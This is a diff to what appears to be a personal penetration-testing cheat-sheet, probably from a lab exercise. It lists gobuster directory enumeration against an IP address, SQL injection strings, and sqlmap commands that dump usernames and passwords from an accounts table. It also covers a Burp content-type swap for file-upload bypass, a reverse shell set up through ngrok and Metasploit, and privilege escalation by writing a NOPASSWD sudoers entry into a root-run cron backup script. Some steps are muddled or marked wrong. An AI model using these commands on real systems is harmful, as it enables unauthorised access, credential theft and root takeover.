@@ -1,3 +1,10 @@
+---------------------------------------------------------------- GOBUSTER -----------------------------------------------------------------------------------------
+
+-- Run gobuster enumeration
+gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://52.74.183.150 -o results.txt
+
+---------------------------------------------------------------- SQL INJECTION ------------------------------------------------------------------------------------
+
 -- SQLI test query
 ' OR 1=1 -- 
 ' OR '1'='1
@@ -24,13 +31,13 @@
 sqlmap -r sql.txt -p promo_code -dbs
 
 -- SQLMAP get table name
-sqlmap -r sql.txt -p promo-code -D phplogin -tables
+sqlmap -r sql.txt -p promo_code -D phplogin -tables
 
 -- SQLMAP get Columms name
 sqlmap -r sql.txt -p promo_code -D phplogin -T accounts --columns --technique=T -time-sec=5    
 
 --SQLMAP dump infomation
-sqlmap -r sql.txt -p promo_code -D phplogin -T accounts -C username,password --technique=T -time-sec=5
+sqlmap -r sql.txt -p promo_code -D phplogin -T accounts -C username, password --dump --technique=T -time-sec=5
 
 
 -----------------------------------------------------------SQL CREATE STATEMENT------------------------------------------------------------------------------------
@@ -63,6 +70,9 @@ CREATE TABLE IF NOT EXISTS `accounts` (
 INSERT INTO `accounts` (`id`, `username`, `password`, `email`) VALUES (1, 'test', '$2y$008c5926ca861023c1d2a36653fd88e2', 'test@test.com');
 
 
+------------------------------------------------------------- BURPSUITE ---------------------------------------------------------------------------
+-- Replace Content type
+Content-Type: image/jpeg
 
 ------------------------------------------------------------- REVERSE SHELL WITH NGROK ---------------------------------------------------------------------------
 -- Start NGROK
@@ -82,7 +92,44 @@ set LPORT 4444
 run
 
 
--- Add Sudo code to backup script
+-- Add Sudo code to backup script (WRONG)
 echo "echo \"$USERNAME ALL=(ALL) NOPASSWD:ALL\" > /etc/sudoers.d/\$USERNAME" >> backup.sh
 
 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+export TERM=xterm
+stty raw -echo; fg
+
+
+sudo usermod -aG crontab cronuser
+
+echo '#!/bin/bash' > backup
+echo 'sudo usermod -aG sudo cronuser' >> backup
+chmod +x backup.sh
+
+
+
+mkdir "backup scripts"
+nano /usr/local/bin/backup scripts
+
+sudo nano /etc/crontab
+
+*  *    * * *   root    /usr/local/bin/backup\ scripts/backup.sh
+
+
+
+
+
+nano backup.sh
+#!/bin/bash
+echo "Command succeeded at $(date)" >> /home/cronuser/backup_log.txt
+
+chmod 711 backup.sh
+
+sudo chown root:root /usr/local/bin/backup\ scripts/backup.sh
+
+
+sudo usermod -aG sudo cronuser
+
+chmod +x backup.sh
